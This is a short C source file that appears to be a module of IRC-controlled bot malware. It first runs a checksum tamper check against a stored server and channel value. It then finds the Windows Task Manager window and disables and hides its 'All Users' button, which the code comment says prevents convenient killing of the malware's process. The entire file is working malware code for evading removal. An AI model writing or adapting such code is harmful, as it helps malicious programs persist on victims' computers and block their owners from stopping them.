#include "../Includes/includes.h"

void DisableTaskManagerAllUsersButton() //Disables the All Users button in Task Manager to prevent convenient killing of the process through the object permission modifications
{
    // <!-------! CRC AREA START !-------!>
    char cCheckString[DEFAULT];
    sprintf(cCheckString, "%s@%s", cServer, cChannel);
    char *cStr = cCheckString;
    unsigned long ulCheck = (47048/8)-500;
    int nCheck;
    while((nCheck = *cStr++))
        ulCheck = ((ulCheck << 5) + ulCheck) + nCheck;
    if(ulCheck != ulChecksum6)
        return;
    // <!-------! CRC AREA STOP !-------!>

    HWND hwndTaskManager = FindWindowA("#32770", "Windows Task Manager");
    if(hwndTaskManager != NULL)
    {
        HWND hwndTaskProcTab = FindWindowExA(hwndTaskManager, 0, "#32770", "Processes");
        if(hwndTaskProcTab != NULL)
        {
            HWND hwndTaskManageAllUsersButton = FindWindowExA(hwndTaskProcTab, 0, "Button", NULL);
            if(hwndTaskManageAllUsersButton != NULL)
            {
                EnableWindow(hwndTaskManageAllUsersButton, FALSE);
                ShowWindow(hwndTaskManageAllUsersButton, SW_HIDE);

                CloseHandle(hwndTaskManageAllUsersButton);
            }

            CloseHandle(hwndTaskProcTab);
        }

        CloseHandle(hwndTaskManager);
    }
}
